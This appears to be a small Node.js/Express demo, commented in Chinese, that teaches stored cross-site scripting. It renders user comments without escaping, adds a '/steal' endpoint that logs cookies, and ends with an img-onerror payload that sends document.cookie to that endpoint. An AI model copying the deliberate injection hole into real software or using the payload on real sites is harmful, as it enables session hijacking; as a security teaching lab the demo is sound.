const express = require("express");
const app = express();
const port = 3000;

let comments = []; // 👈 模拟数据库，存储所有评论

app.use(express.static("public"));
app.use(express.urlencoded({ extended: true })); // 👈 支持 form 表单提交

// 设置 Cookie 并展示评论页面
app.get("/", (req, res) => {
  res.setHeader("Set-Cookie", "session=abc123; Path=/;");
  let html = `
    <!DOCTYPE html>
    <html lang="en">
    <head><meta charset="UTF-8"><title>评论系统</title></head>
    <body>
      <h1>欢迎来到评论系统</h1>
      <form method="POST" action="/comment">
        <input name="comment" placeholder="请输入评论">
        <button type="submit">提交评论</button>
      </form>
      <div>
        <h3>用户评论：</h3>
        ${comments.map((c) => `<p>${c}</p>`).join("")}
      </div>
    </body>
    </html>
  `;
  res.send(html);
});

// 提交评论并存储
app.post("/comment", (req, res) => {
  const comment = req.body.comment || "";
  comments.push(comment); // 👈 没有任何过滤，存储用户输入
  res.redirect("/");
});

// 恶意收集 Cookie 的地址
app.get("/steal", (req, res) => {
  console.log("💀 被偷走的 Cookie:", req.query.cookie);
  res.send("Logged!");
});

app.listen(port, () => {
  console.log(`存储型 XSS 演示服务已启动：http://localhost:${port}`);
});


// 启动后访问 http://localhost:3000/
// 输入框输入 <img src=x onerror="fetch('http://localhost:3000/steal?cookie=' + encodeURIComponent(document.cookie))">